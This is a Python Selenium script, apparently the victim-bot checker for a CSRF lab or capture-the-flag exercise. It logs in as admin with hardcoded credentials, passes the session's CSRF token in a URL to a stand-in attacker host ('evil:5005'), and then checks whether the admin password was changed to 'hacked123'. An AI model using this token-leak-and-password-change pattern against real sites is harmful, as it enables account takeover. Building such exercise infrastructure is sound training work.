import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
#from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import sys
URL = "http://web:5000"
ATTACKER_PAGE = "http://evil:5005/login"

def get_csrf_token(driver):
    driver.get(f"{URL}/change")
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "csrf_token")))
    csrf_token = driver.find_element(By.NAME, "csrf_token").get_attribute("value")
    return csrf_token

def check():
    print("Starting check...", flush=True)
    
    #service = Service(ChromeDriverManager().install())
    options = Options()
    options.add_argument('--no-sandbox')
    options.add_argument('--headless')  # Без GUI
    options.add_argument('--disable-dev-shm-usage')
    #driver = webdriver.Chrome(service=service, options=options)
    driver = webdriver.Chrome(options=options)
    
    try:
        # Открываем страницу логина
        print(f"Opening login page: {URL}/login", flush=True)
        driver.get(f"{URL}/login")
        
        # Ожидаем загрузку формы логина
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        
        # Вводим логин и пароль
        driver.find_element(By.NAME, "username").send_keys("admin")
        driver.find_element(By.NAME, "password").send_keys("admin123")
        driver.find_element(By.NAME, "password").send_keys(Keys.RETURN)
        
        time.sleep(2)  # Даем время на обработку входа
        
        if "Welcome, admin!" not in driver.page_source:
            print("Failed to log in as admin", flush=True)
            driver.quit()
            return
        
        print("Logged in as admin", flush=True)

        # Получаем CSRF-токен
        csrf_token = get_csrf_token(driver)
        print(f"CSRF Token: {csrf_token}", flush=True)
        
        # Открываем вредоносную страницу
        print(f"Opening attacker page: {ATTACKER_PAGE}?csrf_token={csrf_token}", flush=True)
        driver.get(f"{ATTACKER_PAGE}?csrf_token={csrf_token}")
        
        # Ожидаем загрузку страницы
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        print("Page loaded successfully", flush=True)
        
        time.sleep(5)  # Даем время на выполнение CSRF-атаки
        
        # Пробуем снова войти в систему с новым паролем
        print(f"Re-opening login page: {URL}/login", flush=True)
        driver.get(f"{URL}/login")
        
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        
        driver.find_element(By.NAME, "username").send_keys("admin")
        driver.find_element(By.NAME, "password").send_keys("hacked123")
        driver.find_element(By.NAME, "password").send_keys(Keys.RETURN)
        
        time.sleep(2)
        
        if "Welcome, admin!" in driver.page_source:
            print("CSRF exploit worked! ✅", flush=True)
            #sys.exit()
        else:
            print("CSRF exploit failed! ❌", flush=True)
    
    except Exception as e:
        print(f"Error: {e}", flush=True)
    
    finally:
        driver.quit()


print("Checker script started", flush=True)
while True:
    print("Checking...", flush=True)
    check()
    time.sleep(10)